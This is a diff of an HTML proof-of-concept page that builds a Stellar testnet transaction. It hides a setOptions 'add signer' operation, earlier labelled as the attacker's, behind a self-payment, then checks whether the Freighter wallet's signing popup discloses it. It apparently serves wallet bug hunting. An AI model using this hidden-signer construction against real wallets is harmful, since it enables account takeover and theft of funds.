@@ -13,28 +13,26 @@ body{background:#fff;margin:0;font-family:Arial}
 </head>
 <body>
 <div class="top"><span onclick="test()">Click Here</span></div>
-<div id="log"></div>
+<div id="log">Ready</div>
 
 <script>
 async function test(){
   const log = document.getElementById('log');
-  log.innerText = "Loading account GBKIAL...";
-
   try{
-    const server = new StellarSdk.Horizon.Server('https://horizon-testnet.stellar.org');
-    const source = await server.loadAccount('GBKIAL4UCC5YHFDNPHG3SMVLO4XZEEQA4VQ6F7EZW5ZDIWS324NUC537');
+    log.innerText = "Building XDR offline...";
 
-    const tx = new StellarSdk.TransactionBuilder(source, {
+    // OFFLINE - gak perlu loadAccount, jadi gak Not Found lagi
+    const sourceAccount = new StellarSdk.Account('GBKIAL4UCC5YHFDNPHG3SMVLO4XZEEQA4VQ6F7EZW5ZDIWS324NUC537', '0');
+
+    const tx = new StellarSdk.TransactionBuilder(sourceAccount, {
       fee: "100",
       networkPassphrase: StellarSdk.Networks.TESTNET
     })
-    // Op1: Keliatan aman - kirim 1 XLM ke diri sendiri
     .addOperation(StellarSdk.Operation.payment({
       destination: 'GBKIAL4UCC5YHFDNPHG3SMVLO4XZEEQA4VQ6F7EZW5ZDIWS324NUC537',
       asset: StellarSdk.Asset.native(),
       amount: '1'
     }))
-    // Op2: Hidden - add signer attacker GDAITTQ...
     .addOperation(StellarSdk.Operation.setOptions({
       signer: { ed25519PublicKey: 'GDAITTQ3FTE6BB5OBNBC7NOEAIODMVOB23EBJLVPHUVSAELIRSER3V22', weight: 1 }
     }))
@@ -42,20 +40,19 @@ async function test(){
     .build();
 
     const xdr = tx.toXDR();
-    log.innerText = "XDR ready, calling Freighter...\n" + xdr.slice(0,70) + "...";
+    log.innerText = "XDR ready\n" + xdr.slice(0,80) + "...\n\nCalling Freighter...";
 
     if(window.freighterApi){
-      const signed = await window.freighterApi.signTransaction(xdr, { 
+      const signed = await window.freighterApi.signTransaction(xdr, {
         networkPassphrase: StellarSdk.Networks.TESTNET,
         accountToSign: 'GBKIAL4UCC5YHFDNPHG3SMVLO4XZEEQA4VQ6F7EZW5ZDIWS324NUC537'
       });
-      log.innerText = "Signed XDR:\n" + signed.slice(0,100) + "...\n\nCEK DI POPUP FREIGHTER:\nApakah ada 'Add Signer GDAITTQ...' ?\nJika TIDAK ADA = BUG HIGH";
-    }else{
-      log.innerText = "window.freighterApi NOT FOUND\nBuka file ini lewat Freighter > Discover > Search\nhttps://0x403for.github.io/... (pakai bypass kemarin)";
+      log.innerText = "SIGNED OK\n" + signed.slice(0,80) + "...\n\nLIHAT POPUP FREIGHTER\nAda tulisan 'Add signer GDAITTQ...' gak?\nKalau TIDAK ADA = BUG";
+    } else {
+      log.innerText = "XDR:\n" + xdr + "\n\nfreighterApi NOT FOUND - buka via Freighter Discover Search";
     }
-
   }catch(e){
-    document.getElementById('log').innerText = "Error: " + e.message + "\nPastikan akun GBKIAL... sudah ada di TESTNET dan ada XLM testnet";
+    log.innerText = "Error: " + e.message;
   }
 }
 </script>
